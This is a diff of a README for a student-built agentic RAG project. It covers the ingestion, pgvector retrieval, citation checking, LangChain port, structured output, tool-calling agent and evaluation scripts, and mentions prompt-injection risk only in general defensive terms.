@@ -1,644 +1,389 @@
-# RAG Pipeline — Week 5 complete, Week 6 underway
+# Agentic RAG Pipeline — Week 6
 
-Week 5 builds retrieval-augmented generation without a framework, so every
-step is visible. **Days 28-34 are all done** — ingestion through evaluation,
-plus the Day 34 failure analysis and oral defense write-up at
-[`docs/WEEK5_DEFENSE.md`](docs/WEEK5_DEFENSE.md).
+A Dockerized document question-answering system that extends a hand-built Retrieval-Augmented Generation (RAG) pipeline with LangChain integration, validated structured responses, a tool-calling agent, streaming, and agent security controls.
 
-**Week 6, Day 35** ports that same pipeline onto LangChain (`app/langchain_port/`,
-`POST /ask/langchain`) — see the Week 6 section below.
+Week 6 focuses on how different orchestration approaches affect answer grounding, citation behavior, latency, model usage, and refusal handling. The project retains the underlying retrieval implementation so the framework-based and agentic paths can be compared against the original pipeline.
 
-**Week 6, Day 37** adds validated structured output with retry
-(`POST /ask/structured`) — see "Week 6, Day 37" below.
+## Project Overview
 
-> **Since Week 7 every endpoint except `/ping`, `/auth/*` and the chunk lab requires a
-> `Authorization: Bearer <token>` header** (see "Week 7" at the bottom). The `curl` examples in
-> the older sections predate that — add `-H "Authorization: Bearer $TOKEN"`.
+The application ingests documents, divides their text into searchable chunks, generates local embeddings, stores vectors in PostgreSQL with pgvector, retrieves relevant passages for a question, and uses a configured language model to produce a source-grounded answer.
 
-**Week 6, Days 36 / 38 / 39** add a tool-calling agent with streaming and
-a prompt-injection / scope threat model (`POST /agent`, `POST /agent/stream`)
-— see "Week 6, Days 36 / 38 / 39" at the bottom and
-[`docs/AGENT_THREAT_MODEL.md`](docs/AGENT_THREAT_MODEL.md).
+Week 6 builds on that foundation with:
 
+- **Day 35 — LangChain port:** exposes the existing retrieval and generation pipeline through LangChain's retriever and LCEL abstractions.
+- **Day 36 — Tool-calling agent:** adds an agent loop that can call a document-search tool and use its results when answering.
+- **Day 37 — Structured output:** adds schema validation and retry for predictable response structures.
+- **Days 38–39 — Streaming and security:** adds a streaming agent endpoint and documents prompt-injection and scope risks.
+
+RAG and agents are not competing alternatives. The agentic implementation still uses retrieval. The project therefore compares **direct RAG, structured RAG, and agentic RAG**.
+
+## Main Features
+
+- Document upload and ingestion for supported text, Markdown, and PDF files.
+- Text parsing, normalization, cleaning, and sentence-aware chunking with overlap.
+- Local semantic embeddings using FastEmbed and `BAAI/bge-small-en-v1.5`.
+- PostgreSQL storage with pgvector vector search.
+- Top-k retrieval using cosine distance and optional metadata filters.
+- Source-labeled generation with numbered citations and citation-identifier validation.
+- A LangChain retriever adapter and LCEL generation chain.
+- An agent loop with a document-search tool and execution trace.
+- Structured responses with schema validation and retry.
+- Streaming agent responses.
+- Evaluation scripts for retrieval quality and direct/structured/agent comparisons.
+- Tests for retrieval, generation, structured output, agent behavior, security, and related API functionality.
+
+## System Architecture
+
+### 1. Document ingestion and indexing
+
+```text
+Document upload
+    -> Parse file into page-oriented text
+    -> Clean and normalize text
+    -> Split into overlapping chunks
+    -> Generate local embedding for each chunk
+    -> Store document metadata, chunks, and vectors
+       in PostgreSQL with pgvector
 ```
-Document -> parse -> clean -> chunk -> embed -> pgvector index      <- Day 29
-Question -> embed -> retrieve top-k (+ metadata filters)            <- Day 30
-         -> build prompt -> LLM -> cited, verified answer           <- Day 31
-Eval     -> 30-question frozen set -> Precision@k, Recall@k, MRR     <- Day 32
-Grid     -> chunk_size x top_k, 9 runs, one variable at a time       <- Day 33
-Defense  -> failure analysis + 10-minute oral defense script         <- Day 34 (this commit)
+
+### 2. Direct RAG request
+
+```text
+Question
+    -> Generate question embedding
+    -> Retrieve top-k relevant chunks
+    -> Apply optional metadata filters
+    -> Build prompt with numbered source passages
+    -> Generate answer with the configured LLM
+    -> Validate citation identifiers
+    -> Return answer, citations, and validation status
 ```
 
-## Run it
+### 3. Agentic RAG request
 
-No API key needed -- embeddings run locally (see below).
+```text
+Question
+    -> Agent loop evaluates the next action
+    -> Agent may call document_search
+    -> Application executes the tool and returns its result
+    -> Agent continues or produces a final response
+    -> Return answer, citations, and execution trace
+```
+
+The direct path follows a predefined retrieve-then-generate workflow. The agent path adds a model-controlled tool-selection loop. This flexibility can support more complex workflows, but it also adds model calls, latency, token usage, and additional security considerations.
+
+## Technology Stack
+
+| Component | Technology | Purpose |
+|---|---|---|
+| API | FastAPI | HTTP endpoints and interactive API documentation |
+| Database | PostgreSQL | Stores document and chunk metadata |
+| Vector extension | pgvector | Stores and searches embedding vectors |
+| Vector index | IVFFlat with cosine distance | Approximate nearest-neighbor retrieval |
+| Embeddings | FastEmbed, ONNX Runtime | Local 384-dimensional embeddings |
+| Embedding model | `BAAI/bge-small-en-v1.5` | Embeds document chunks and user questions |
+| LLM integration | Configured chat-model API | Generates grounded answers and supports agent decisions |
+| Framework integration | LangChain, LCEL | Composes retriever and model components |
+| Runtime | Docker Compose | Runs the API and database services |
+| Tests | pytest | Checks pipeline behavior and regression cases |
+| Evaluation | Python scripts in `eval/` | Measures retrieval and compares answer modes |
+
+Generation requires the configured LLM provider. Embeddings are generated locally and do not require a hosted embeddings endpoint. Configure provider values through `.env` using `.env.example` as a template. Never commit the real `.env` file or credentials.
+
+## Requirements
+
+- Docker and Docker Compose for the containerized setup.
+- A configured LLM API key for endpoints that generate model responses.
+- Git and a terminal for development workflows.
+- Python and the dependencies in `requirements.txt` if running tests outside Docker.
+
+## Setup and Run
+
+Run commands from the application directory, `rag-pipeline/`, when using the original nested project layout.
+
+1. Create a local environment file from the example:
+
+   ```bash
+   cp .env.example .env
+   ```
+
+2. Add the required database and LLM settings to `.env`. Keep this file out of version control.
+
+3. Build and start the services:
+
+   ```bash
+   docker compose up --build
+   ```
+
+4. Open the application:
+
+   - Chunk lab: http://127.0.0.1:8000/
+   - API documentation: http://127.0.0.1:8000/docs
+   - Health endpoint: `GET /ping`
+
+FastEmbed downloads its embedding model on the first run. This initial download may take longer than subsequent runs; the model is cached in a Docker volume.
+
+If the project has been moved to the repository root, run the same Docker commands from the directory that contains `docker-compose.yml`.
+
+## Core Pipeline Implementation
+
+### Parsing and cleaning
+
+The parsing stage converts uploaded file bytes into text pages. PDF parsing preserves page numbers; plain text and Markdown are handled as single-page inputs.
+
+The cleaning stage runs before chunking. It repairs hard line wrapping, rejoins words split by hyphenation across line breaks, normalizes Unicode with NFKC, handles compatibility ligatures and non-breaking spaces, and removes control characters. Cleaning first keeps stored offsets aligned with the text used by the rest of the pipeline.
+
+Relevant modules:
+
+- `app/ingestion/parsers.py`
+- `app/ingestion/cleaning.py`
+
+### Chunking
+
+The chunking stage groups sentences, headings, and list lines into chunks within a configured token budget. The configured overlap carries part of the previous chunk into the next chunk so that information near chunk boundaries is less likely to be lost. An individual sentence that exceeds the chunk target can be split by words as a fallback.
+
+Relevant module:
+
+- `app/ingestion/chunking.py`
+
+Chunk size, overlap, and retrieval top-k influence the context available to the model. The evaluation grid is used to compare combinations rather than assuming one configuration is best for every corpus.
+
+### Local embeddings and vector storage
+
+`app/core/embeddings.py` provides the embedding entry point. FastEmbed runs `BAAI/bge-small-en-v1.5` locally and produces 384-dimensional vectors. CPU-bound embedding work is moved to a worker thread so it does not unnecessarily block the async event loop. Embedding failures are surfaced as errors instead of treating an unsuccessfully embedded document as indexed.
+
+PostgreSQL stores vectors in a pgvector column. The database migration enables the vector extension and creates an IVFFlat cosine-distance index. The SQLite test configuration uses a JSON variant for vector values because SQLite does not implement pgvector's vector operators.
+
+Local embeddings avoid a separate embedding API key, embedding charges, and request-time dependence on an embedding provider. The trade-offs include an initial model download and potentially lower semantic retrieval quality than a larger hosted embedding model.
+
+### Retrieval
+
+`POST /retrieve` embeds the question using the same embedding model used during ingestion and returns the nearest chunks by cosine distance. Optional metadata filters such as document ID or source type narrow the candidate set before ranking.
+
+Keeping retrieval separate from generation makes it possible to evaluate whether the correct evidence was found without conflating that result with the quality of the generated answer.
+
+Relevant modules:
+
+- `app/services/retrieval_service.py`
+- `app/routers/retrieval.py`
+
+#### IVFFlat search configuration
+
+During development, retrieval returned no results against a populated PostgreSQL database without raising an error. The IVFFlat index used `lists = 100`, while the default search examined only one cluster. On a small corpus, the selected cluster could omit the nearest vectors.
+
+The implementation addresses this by setting `ivfflat.probes = 100` locally for the transaction performing the query. This examines more clusters and can improve recall at the cost of additional search work. The appropriate setting should be benchmarked against the actual corpus size and latency requirements.
+
+### Grounded generation and citations
+
+`POST /ask` performs retrieval, builds a prompt containing numbered passages and source metadata, and asks the configured LLM to answer from the retrieved context. Source labels can include the filename and page number where available.
+
+The response includes citation information and a validation result. Citation identifiers are checked against the retrieved sources; unknown identifiers are not treated as valid citations. If no passages are retrieved, the standard RAG path can return the configured no-documents response without calling the LLM.
+
+Citation-identifier validation does not independently prove that a claim is entailed by its cited passage. That limitation is why source correctness and refusal behavior are also evaluated.
+
+Relevant modules:
+
+- `app/services/generation_service.py`
+- `app/routers/ask.py`
+
+## Week 6 Implementation
+
+### Day 35 — LangChain integration
+
+The LangChain implementation is located in `app/langchain_port/` and is exposed through `POST /ask/langchain`.
+
+**Retriever adapter — `app/langchain_port/retriever.py`**
+
+`PgVectorRetriever` delegates to the existing retrieval service. It does not reimplement vector search, metadata filtering, or the IVFFlat search configuration. It adapts the project's retrieval function to the interface expected by LangChain retriever components.
+
+**LCEL chain — `app/langchain_port/chain.py`**
+
+The generation chain composes a `ChatPromptTemplate` and a chat model using LangChain Expression Language (LCEL). It reuses the project's grounding prompt, citation pattern, and no-document response rather than maintaining a separate set of rules.
+
+**Design outcome**
+
+LangChain changes how the retrieval and generation components are composed, but it does not replace the underlying retrieval implementation or automatically improve retrieval quality. The framework provides useful interfaces and integration patterns while introducing dependency-managed behavior such as retries and timeouts.
+
+The LangChain test suite replaces the module-level chain with a fake chain object. This avoids trying to monkeypatch an instance method on a Pydantic-backed `RunnableSequence`, which may reject assignment to undeclared fields.
+
+### Day 36 — Tool-calling agent
+
+The agent implementation adds a loop that allows the model to request an application tool, including document search. The application executes the requested tool, returns its output to the model, and continues until the model produces a final response or a stopping condition is reached.
+
+The `POST /agent` endpoint returns the answer and associated execution details. Depending on the response, these can include citations, steps, tool calls, model-call counts, usage, budget status, and trace information.
+
+This architecture enables the model to decide when retrieval is needed, but it also creates additional failure modes. A model can make unsupported inferences, call tools unnecessarily, or react incorrectly to malicious instructions embedded in retrieved content. Tool outputs should be handled as untrusted evidence, not as instructions that override application policy.
+
+Relevant modules:
+
+- `app/agent/loop.py`
+- `app/agent/tools.py`
+- `app/routers/agent.py`
+
+### Day 37 — Validated structured output
+
+The `POST /ask/structured` endpoint adds schema-based response validation and retry. Instead of relying only on free-form text, callers can request a response that follows a predictable structure suitable for downstream application code.
+
+Schema validation checks the shape and types of a response; it does not establish that the response is factually correct. Grounding, source checks, and appropriate refusal behavior remain necessary.
+
+Relevant modules:
+
+- `app/langchain_port/structured.py`
+- `app/routers/ask_structured.py`
+
+### Days 38–39 — Streaming and agent security
+
+The `POST /agent/stream` endpoint supports streaming agent responses, allowing clients to receive output incrementally rather than waiting for the complete response.
+
+The threat model in `docs/AGENT_THREAT_MODEL.md` covers prompt-injection and scope risks associated with agent tools and retrieved content. Retrieved documents can contain adversarial text, so the system must distinguish application instructions from document content, constrain available tools, and validate requests and outputs.
+
+The existence of a threat model documents risks and intended defenses; it is not a guarantee that every possible attack has been prevented. Security controls should be validated with tests and adversarial cases.
+
+## API Endpoints
+
+| Endpoint | Purpose |
+|---|---|
+| `GET /ping` | Health check |
+| `POST /documents` | Upload and ingest a document |
+| `POST /retrieve` | Retrieve relevant chunks without generating an answer |
+| `POST /ask` | Direct RAG answer with citations |
+| `POST /ask/langchain` | LangChain-based RAG answer path |
+| `POST /ask/structured` | Schema-validated answer with retry |
+| `POST /agent` | Agentic RAG with tool use and execution trace |
+| `POST /agent/stream` | Streaming agent response |
+| `/auth/*` | Authentication routes available in the current application |
+| `/docs` | Interactive OpenAPI documentation |
+
+The live OpenAPI page at `/docs` is the source of truth for exact request fields, response schemas, and authentication requirements in the checked-out version.
+
+### Authentication
+
+In the current project notes, protected endpoints require an `Authorization: Bearer <token>` header, with exceptions for `/ping`, authentication routes, and the chunk lab. Authenticate through the configured login endpoint and attach the returned access token to protected API requests. Check `/docs` for the exact login payload and token response.
+
+## Evaluation
+
+The repository includes separate evaluation paths for retrieval quality, parameter experiments, and answer-mode comparisons.
+
+### Retrieval evaluation
+
+`eval/eval_set.json` contains a frozen set of 30 questions against a small synthetic corpus made up of a leave policy, product FAQ, and science facts. The questions include factoid, paraphrased, ambiguous, and no-answer types.
+
+`eval/run_eval.py` evaluates retrieval using Precision@k, Recall@k, and Mean Reciprocal Rank (MRR). Answerable questions use a target document and exact gold phrase. No-answer questions are considered separately because they do not have one correct target chunk. This design is reproducible and lightweight, but exact-span matching is a simplified relevance measure and does not capture every semantically valid answer.
+
+### Chunk-size and top-k grid
+
+`eval/run_grid.py` runs nine combinations:
+
+- Chunk size: `250`, `500`, `1000`
+- Top-k: `3`, `5`, `10`
+- Overlap: held at 10% of chunk size
+
+Holding the other settings constant makes the effect of chunk size and top-k easier to interpret. Results should be read alongside corpus size: when the corpus contains fewer chunks than top-k, precision values are constrained by the number of available chunks.
+
+### Direct, structured, and agent comparison
+
+`eval/run_compare.py` compares direct, structured, and agent modes using a sample from the evaluation set. Reported metrics include:
+
+- Answer and source correctness
+- Correct refusal rate for no-answer questions
+- Invalid or unsupported citation identifiers
+- Median and p95 latency
+- Model calls and tool calls
+- Token usage
+
+One observed 12-question run reported 100% source correctness, 100% correct refusal, and 0% bad citations for all three modes. In that run, median latency was 3.78 seconds for direct mode, 9.19 seconds for structured mode, and 13.71 seconds for agent mode. Agent mode averaged 2.2 model calls, 1.2 tool calls, and 2,752 tokens; direct mode averaged one model call and 1,122 tokens.
+
+These are results from a small evaluation sample and one runtime environment, not general performance guarantees. The test set includes no-answer cases, including a question about the monthly price of an Enterprise plan that is not described in the synthetic corpus. After the updated evaluation file was copied into the running container, the sampled run reported correct refusal for that case. Keep the host and container versions of `eval/eval_set.json` synchronized to reproduce the result.
+
+### Run evaluation scripts
+
+Run from the application directory with the services available:
 
 ```bash
-docker compose up --build
-```
-
-The first document you upload will be slow (10-30s): fastembed downloads its
-~130MB model on first use. It's cached in a Docker volume afterward, so
-every upload after that is fast, and restarting the containers doesn't
-re-download it.
-
-Open **http://127.0.0.1:8000/** — the *chunk lab*. Paste text and change chunk
-size / overlap to see chunks re-cut live (highlighted text is the overlap), or
-upload a `.txt`, `.md` or `.pdf` to run the real pipeline: parse, clean, chunk,
-embed, and store. The page is served by the API itself, so there is no CORS
-setup and nothing to build. API docs are at `/docs`.
-
-Tests need no Docker or API key: `pip install -r requirements.txt && pytest -v`
-(the embedding provider is mocked, same "fast fake" approach as every other
-provider call in this sprint).
-
-## What each stage does, and why
-
-**Parse** (`ingestion/parsers.py`) — file bytes to pages. PDFs keep their page
-number; txt/md are a single page with no number.
-
-**Clean** (`ingestion/cleaning.py`) — runs *before* chunking, so stored offsets
-refer to the text we actually keep. It undoes hard line-wrapping, repairs
-words split by a hyphen at a line break, folds ligatures (`ﬁ` -> `fi`) and
-non-breaking spaces with Unicode NFKC, and strips control characters. Noise left
-in here would end up inside embeddings and in the LLM's prompt.
-
-**Chunk** (`ingestion/chunking.py`) — packs whole sentences (or list/heading
-lines) into chunks up to `chunk_size` tokens, repeating the last
-`chunk_overlap` tokens at the start of the next chunk. A single sentence
-bigger than `chunk_size` falls back to being split by words.
-
-**Embed** (`core/embeddings.py`, Day 29) — every chunk's text is embedded
-LOCALLY via `fastembed` (ONNX Runtime, model `BAAI/bge-small-en-v1.5`, 384
-dimensions) and stored on the chunk row. This is the ONLY place in the app
-that generates embeddings, mirroring `llm_client.py` from the Week 4
-project: one place to swap the model, one place to mock in tests. Since
-fastembed is synchronous and CPU-bound, it runs in a worker thread
-(`asyncio.to_thread`) rather than blocking the event loop. A model failure
-is raised as `EmbeddingError` (502) — nothing is persisted for a document
-whose embeddings couldn't be generated.
-
-**Why local instead of a hosted embeddings API:** no API key, no billing,
-no provider outage to handle, and no network dependency at request time —
-at the cost of somewhat lower embedding quality than a large hosted model,
-and a one-time ~130MB model download on first use (Groq, notably, has no
-embeddings endpoint at all, despite some third-party client libraries
-implying otherwise — chat, audio, and TTS only).
-
-**Store** (`models/models.py`, `alembic/versions/8a1c2f9d4b3e_...py`) — the
-embedding lives in a real `pgvector` column on Postgres, with an `ivfflat`
-cosine-distance index built by the Day 29 migration
-(`CREATE EXTENSION vector`, then the index). In tests, the same column falls
-back to a plain JSON array under SQLite (`Vector(...).with_variant(JSON(),
-"sqlite")`), since pgvector has no SQLite backend — same data, no real
-Postgres or API key needed to run the suite.
-
-**Retrieve** (`services/retrieval_service.py`, `routers/retrieval.py`, Day 30)
-— `POST /retrieve` embeds the query with the same local model used at
-ingestion, then returns the `top_k` chunks with the smallest cosine
-distance. Metadata filters (`document_id`, `source_type`) narrow the
-candidate set *before* ranking, not after — so `top_k` comes from the
-filtered set instead of being padded out by irrelevant documents that
-happened to rank low. Deliberately no LLM call in this endpoint: keeping
-retrieval separate means its quality (did the right chunk come back at
-all?) can be evaluated independently of answer quality (Day 31+).
-
-On Postgres, the distance is computed *inside the database* via pgvector's
-cosine-distance operator, using the Day 29 `ivfflat` index — an approximate
-nearest-neighbor search, not a full scan, which is what makes this viable
-at real corpus sizes. The test suite (SQLite) has no pgvector operator to
-call, so it fetches the (test-scale) candidate rows and ranks them in
-Python instead — correct for a handful of rows, and a direct illustration
-of why the Postgres path needs an index rather than doing the same thing
-at scale.
-
-**A real bug caught and fixed while building this:** the first version
-returned zero results against a real, populated Postgres database, with
-no error at all. The cause was `ivfflat`'s `lists`/`probes` trade-off: the
-Day 29 index splits the table into `lists = 100` clusters and, by
-default, a search probes only **1** of them. On a small corpus (a handful
-of documents, nowhere near 100 rows worth of real clustering), that one
-probed cluster can easily contain none of the actual nearest vectors —
-so the query runs successfully and returns nothing, which is a much
-harder failure to notice than an error would be. Fixed with
-`SET LOCAL ivfflat.probes = 100` before the query, scoped to that one
-transaction so it can't leak onto a pooled connection reused by another
-request. The trade-off: more probes means slower (but more accurate)
-search — the right number for a real corpus depends on its size and
-would be revisited once actual data volume is known, exactly the kind of
-tuning the Day 33 chunk-size/top-k experiment log is for.
-
-```bash
-curl -X POST http://127.0.0.1:8000/retrieve \
-  -H "Content-Type: application/json" \
-  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
-```
-
-**Answer with citations** (`services/generation_service.py`, `routers/ask.py`,
-Day 31) — `POST /ask` runs the full pipeline: retrieve top-k chunks, build a
-prompt that numbers and labels each one with its source (`[1] (handbook.pdf,
-page 4)`), instruct the model to answer only from that numbered context and
-cite every claim, then generate the answer.
-
-This needs a real LLM, unlike embeddings — set `LLM_API_KEY` in `.env` (see
-`.env.example`; defaults to Groq's chat endpoint, which is a genuinely
-supported Groq feature, unlike their nonexistent embeddings endpoint). If
-retrieval finds nothing, the LLM is never called at all: the refusal
-("I don't know based on the provided documents.") is deterministic, not
-hoped-for from the model.
-
-**The citations are verified, not trusted.** A model told "never cite a
-number that isn't in the context" can still do it anyway, so every `[N]` in
-the answer is checked against the chunks that were actually retrieved.
-A fabricated citation is dropped from the structured `citations` list and
-flips `all_citations_valid` to `false` — the response tells you plainly
-whether the model's citations can be trusted, rather than assuming they
-can.
-
-```bash
-curl -X POST http://127.0.0.1:8000/ask \
-  -H "Content-Type: application/json" \
-  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
-```
-
-## Week 6, Day 35 — LangChain port
-
-`app/langchain_port/` ports the Day 30-31 pipeline onto LangChain's
-`BaseRetriever` and LCEL (`prompt | llm`) chain abstractions, exposed at
-`POST /ask/langchain` — the **identical** request and response contract as
-`/ask`, so the same question can be sent to both endpoints and compared
-directly:
-
-```bash
-curl -X POST http://127.0.0.1:8000/ask/langchain \
-  -H "Content-Type: application/json" \
-  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
-```
-
-**`app/langchain_port/retriever.py`** — `PgVectorRetriever` is a thin adapter
-over `retrieval_service.retrieve()` (Day 30). Nothing about retrieval itself
-is reimplemented: the same pgvector cosine-distance query, the same
-`ivfflat.probes` fix, the same metadata filters applied before ranking all
-run exactly as before. What changes is the shape callers see — any LangChain
-chain can now call `.ainvoke(query)` on it the same way it would call a
-hosted vector-store-backed retriever.
-
-**`app/langchain_port/chain.py`** — rebuilds `generation_service.ask()` (Day
-31) as an LCEL chain (`ChatPromptTemplate | ChatOpenAI`), **reusing** the
-exact same `SYSTEM_PROMPT`, `CITATION_RE`, and `NO_DOCUMENTS_ANSWER` from
-`generation_service.py` rather than duplicating them — same grounding
-instructions, same citation-verification rule, same deterministic refusal
-when nothing is retrieved. Citations are checked here too, not trusted just
-because this path runs through a framework.
-
-### What LangChain actually replaced here (the sprint's own interview question)
-
-- **`ChatOpenAI` replaces `core/llm_client.py`'s hand-rolled `_with_retries`
-  wrapper.** LangChain's chat client has its own retry/timeout handling built
-  in (`max_retries`, `timeout` constructor kwargs) — the exponential-backoff
-  loop from Day 25/31 isn't needed in this file. The trade-off: that retry
-  logic now lives inside a dependency, readable and testable only through
-  LangChain's own code, not this repo's.
-- **`ChatPromptTemplate` replaces the plain f-string message-building** in
-  `generation_service.ask()`. For a two-message prompt like this one it's
-  roughly a wash in lines of code — it starts earning its keep with
-  multi-turn history or few-shot examples, neither of which this project
-  needs yet.
-- **What LangChain did *not* replace:** retrieval logic, the prompt's actual
-  wording, or citation verification. All three are reused as-is from the
-  hand-built version. The retriever is a thin adapter, not a rewrite.
-
-A real bug found while building this port, worth knowing: `RunnableSequence`
-(the object `prompt | llm` produces) is a Pydantic model, so
-`monkeypatch.setattr(chain, "ainvoke", fake_fn)` on an existing instance
-fails with `"RunnableSequence" object has no field "ainvoke"` — Pydantic v2
-only allows assigning already-declared fields. The tests
-(`tests/test_ask_langchain.py`) replace the whole module-level `_chain`
-reference instead (see `FakeLangChainChain` in `tests/conftest.py`), which
-sidesteps the restriction rather than fighting it.
-
-**Evaluation** (`eval/`, Day 32) — `eval/eval_set.json` is a frozen set of 30
-questions (10 factoid, 6 paraphrased, 6 loosely/ambiguously worded, 8
-no-answer) against a small synthetic 3-document corpus
-(`eval/corpus/`: a leave policy, a product FAQ, and a page of science
-facts — picked specifically so the three are topically disjoint and
-cross-document retrieval mistakes are obvious). Each labeled question is
-tagged with its correct source document and an exact short phrase
-(`gold_span`) that must appear in a correct retrieval.
-
-`eval/run_eval.py` ingests the corpus, runs retrieval for every labeled
-question, checks whether `gold_span` shows up in the top-k results, and
-prints Precision@k, Recall@k, and MRR — overall and broken down by
-question type. No-answer questions are reported separately (there's no
-single "correct chunk" to score them against); instead it prints each
-one's top-1 distance, so you can eyeball whether there's a gap that could
-become a similarity threshold later.
-
-```bash
-docker compose cp eval api:/code/eval
 docker compose exec api python eval/run_eval.py
+docker compose exec api python eval/run_grid.py
+docker compose exec api python eval/run_compare.py --per-type 3 --email "eval@x.test" --password "EvalPass123!"
 ```
 
-**Why a single-relevant-item simplification, and why that's named
-explicitly:** each question is scored against exactly one correct
-passage, found by exact substring match, rather than a human-labeled set
-of every passage that could answer it. This keeps the eval set cheap to
-build and exactly reproducible, at the cost of not capturing questions
-with multiple valid answers. Every number this script prints should be
-read with that trade-off in mind — which is itself a legitimate thing to
-say out loud in an interview, rather than presenting the metrics as more
-rigorous than they are.
-
-`run_eval.py` takes `--chunk-size`, `--chunk-overlap`, and `--top-k` as
-command-line flags specifically so Day 33's chunk-size × k experiment
-grid can call this exact script repeatedly with different values, rather
-than being written from scratch. It also tracks retrieval latency
-(average and p95) and an estimated prompt token count per question
-(`system prompt + question + every retrieved chunk's stored token_count`),
-both written into `eval/results_latest.json` alongside the quality metrics.
-
-**Chunk-size × top-k grid** (`eval/run_grid.py`, Day 33) — calls
-`run_eval.py`'s `run()` nine times, once per combination of
-`chunk_size ∈ {250, 500, 1000}` × `top_k ∈ {3, 5, 10}`, holding overlap at
-a fixed 10% of chunk_size so it never becomes a hidden third variable.
-Everything else — the eval set, the embedding model, the prompt — stays
-identical across all nine runs, which is the one rule Day 33 actually
-insists on: change one thing at a time (or the full grid at once), never
-let two variables move together, or a result can't be attributed to a
-cause.
+If the evaluation files are not available inside the running container, copy them first:
 
 ```bash
 docker compose cp eval api:/code/eval
-docker compose exec api python eval/run_grid.py
 ```
 
-Prints a single summary table (Precision@k, Recall@k, MRR, average prompt
-tokens, p95 latency, for all nine cells) and writes `eval/grid_results.json`
-for later comparison. Each document gets re-ingested fresh at every new
-chunk_size — Day 28's dedupe key is content hash *plus* chunk settings, so
-a different chunk_size is correctly treated as a new ingestion, not a
-duplicate; this is the dedupe design working as intended, not a special
-case for the grid.
+Use the script's `--help` output if arguments have changed in your checkout.
 
-**A known artifact in this specific grid, named rather than hidden:** the
-eval corpus is 3 short synthetic documents. At `chunk_size=1000`, each
-document becomes only 1-2 chunks — fewer than `top_k=10` can even return.
-Precision@10 on that row is mechanically capped at (total chunks)/10, not
-a genuine signal about retrieval quality at that setting; the script
-prints a `NOTE` line whenever this applies, and the grid summary repeats
-the reminder at the bottom. Reading a metric without checking whether its
-denominator assumption holds is a very easy mistake to make, and worth
-calling out explicitly rather than presenting a misleading number
-cleanly.
+## Testing
 
-## The trade-offs (the interview-relevant part)
+The test suite uses provider mocks where appropriate to avoid unnecessary external calls during unit tests. The repository includes tests for chunking, cleaning, embeddings, retrieval, document lifecycle, generation, LangChain, structured output, agent loops, agent security, authentication, and tenant isolation.
 
-- **Chunk size.** Small chunks are precise but may lack the context to answer
-  anything. Large chunks carry context but blur several topics into one
-  embedding, so a match no longer tells you *which* part was relevant; they also
-  spend more of the LLM's context window per retrieved chunk.
-- **Overlap.** Protects against an answer straddling a boundary. Costs storage
-  and embedding work (more chunks) and can return near-duplicate results.
-- **Batching embeddings.** Fewer HTTP round-trips and lower latency per
-  document, at the cost of one failure (after retries) discarding the whole
-  document's ingestion rather than partially embedding it. Chosen because a
-  half-embedded document is worse than a clean retry.
-- **ivfflat vs exact search.** ivfflat is approximate — it trades a small
-  amount of recall for speed at scale, unlike a brute-force scan over every
-  vector. `lists = 100` is a placeholder; the right value depends on corpus
-  size and gets revisited once real data volume is known (Day 30 retrieval
-  evaluation touches this directly).
-
-## Week 6, Day 37 — Structured output + retry on invalid model output
-
-`POST /ask/structured` has the same request body, retrieval and grounding
-rules as `/ask/langchain`, but the model must return a **validated JSON
-object** instead of free text that we regex for `[N]`:
+Typical local test command:
 
 ```bash
-curl -X POST http://127.0.0.1:8000/ask/structured \
-  -H "Content-Type: application/json" \
-  -d '{"query": "what does the chunk lab do?", "top_k": 3}'
+pip install -r requirements.txt
+pytest -v
 ```
 
-```json
-{
-  "query": "...", "answerable": true, "answer": "... [1]",
-  "citations": [{"number": 1, "filename": "...", "...": "..."}],
-  "retrieved_count": 3,
-  "attempts": 2,
-  "validation_errors": ["cited_sources: [99] do not exist; valid source numbers are 1..3"]
-}
+Run the tests from the directory containing `requirements.txt` and the test configuration. Tests that require PostgreSQL, Docker, or external provider configuration may need those dependencies configured separately.
+
+## Repository Structure
+
+```text
+rag-pipeline/
+├── app/
+│   ├── agent/              # Agent loop, tools, and scope/security controls
+│   ├── auth/               # Authentication and access control
+│   ├── core/               # Configuration, database, embeddings, LLM client
+│   ├── ingestion/          # Parsing, cleaning, and chunking
+│   ├── langchain_port/     # LangChain retriever, chain, and structured output
+│   ├── models/             # Database models
+│   ├── routers/             # FastAPI route handlers
+│   └── services/            # Ingestion, retrieval, generation, and audit logic
+├── alembic/                 # Database migrations
+├── docs/
+│   ├── AGENT_THREAT_MODEL.md
+│   └── WEEK6_AGENT_VS_RAG.md
+├── eval/
+│   ├── corpus/              # Synthetic evaluation documents
+│   ├── eval_set.json        # Frozen evaluation questions
+│   ├── run_eval.py          # Retrieval evaluation
+│   ├── run_grid.py          # Chunk-size/top-k experiment
+│   └── run_compare.py       # Direct/structured/agent comparison
+├── tests/                   # Automated tests
+├── Dockerfile
+├── docker-compose.yml
+├── requirements.txt
+└── .env.example
 ```
 
-`attempts` and `validation_errors` expose the retry layer: `attempts: 0`
-means the LLM was never called (nothing retrieved); `attempts > 1` means the
-first reply broke the contract and was corrected.
+The exact file layout may differ if the project has been moved from the original `rag-pipeline/` subdirectory to the repository root.
 
-### The contract (`GroundedAnswer`, `app/schemas.py`)
+## Limitations and Engineering Considerations
 
-`answerable: bool`, `answer: str (non-empty)`, `cited_sources: list[int >= 1]`.
-Internal consistency is enforced by a model validator: `answerable=true`
-needs at least one citation; `answerable=false` must cite nothing. Duplicate
-or unordered citations are *normalized*, not rejected — harmless noise isn't
-worth a retry's tokens and latency.
+- The evaluation corpus is small and synthetic; measured quality may not generalize to real-world collections.
+- Exact gold-span matching uses one relevant passage per answerable question and may miss semantically correct retrievals.
+- Semantic similarity indicates topical relatedness, not proof that a passage answers the question.
+- Citation-ID validation catches invalid references but does not prove factual entailment.
+- Agent loops can increase latency, token usage, and model calls; budgets and stopping conditions are important.
+- Retrieved content can contain prompt-injection attempts. Treat it as untrusted data and validate agent behavior.
+- Conflicting-document resolution is not established by the described synthetic evaluation corpus.
+- Local embedding inference can be CPU-bound; large-scale ingestion and concurrent traffic require additional performance testing.
+- IVFFlat configuration should be tuned against corpus size, recall, and latency requirements.
+- Keep secrets in local environment files and never commit API keys, database passwords, or production tokens.
 
-### Three layers of defence (`app/langchain_port/structured.py`)
+## Configuration and Secret Management
 
-1. **Constrained decoding** — `response_format=json_schema` is bound onto the
-   model. Cuts invalid output sharply; provider/model dependent; guarantees
-   nothing about *meaning*.
-2. **Schema validation** — Pydantic: types, ranges, internal consistency.
-3. **Semantic validation** — checks needing request context: every cited
